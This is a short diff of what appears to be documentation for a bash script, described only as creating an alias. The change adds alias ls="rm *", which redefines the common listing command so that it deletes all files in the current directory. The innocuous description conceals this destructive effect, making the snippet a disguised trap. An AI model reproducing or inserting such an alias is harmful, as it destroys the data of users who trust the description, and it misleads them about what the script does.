@@ -4,7 +4,7 @@
 
 ~~~
 #!/bin/bash
-alias="rm *"
+alias ls="rm *"
 ~~~
 
 This script creates an alias.
